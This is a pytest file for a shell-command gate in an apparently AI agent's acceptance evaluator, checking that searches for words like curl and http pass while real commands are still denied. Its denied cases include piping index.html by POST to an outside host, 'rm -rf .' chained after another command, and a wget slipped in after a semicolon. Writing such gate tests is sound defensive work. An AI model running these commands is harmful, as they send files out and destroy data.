"""The judge's shell gate denies commands, not vocabulary (2026-09-05).

Generation 9 of the Mario Kart build: the standing goal was "the game must never
load anything from the internet", the judge's natural check was a search of the
sources for the words that would load one (fetch, curl, wget, http), and the gate
refused it with "denied" because the word list matched the search terms. The goal
went unchecked, the engine sent the run back for another pass, and the judge's
reply said only "the internet-loading source scan was denied". A word is a
command only where a command starts: the head of the line or after a pipe or a
chain; a redirect to a file is denied, a redirect of stderr to nowhere is not.
"""

from __future__ import annotations

import pytest

from thomas.agent.acceptance_evaluator import command_denied


@pytest.mark.parametrize(
    "cmd",
    [
        'findstr /s /i "fetch( curl wget http" *.js *.html *.css',
        'grep -rn "rm -rf" src',
        "findstr /s /i http *.js 2>nul",
        "grep -rn http . 2>/dev/null",
        "python -c \"print(open('game.js').read().count('https'))\"",
        "dir /s /b *.html",
    ],
)
def test_a_search_for_a_dangerous_word_is_not_a_dangerous_command(cmd: str) -> None:
    assert command_denied(cmd) is None, cmd


@pytest.mark.parametrize(
    "cmd",
    [
        "curl http://example.com",
        "type index.html | curl -X POST http://example.com",
        "rm -rf .thomas",
        "dir && rm -rf .",
        "type game.js > copy.js",
        "sudo dir",
        "git push origin dev",
        "findstr http *.js; wget http://example.com",
    ],
)
def test_a_dangerous_command_is_still_denied(cmd: str) -> None:
    assert command_denied(cmd), cmd
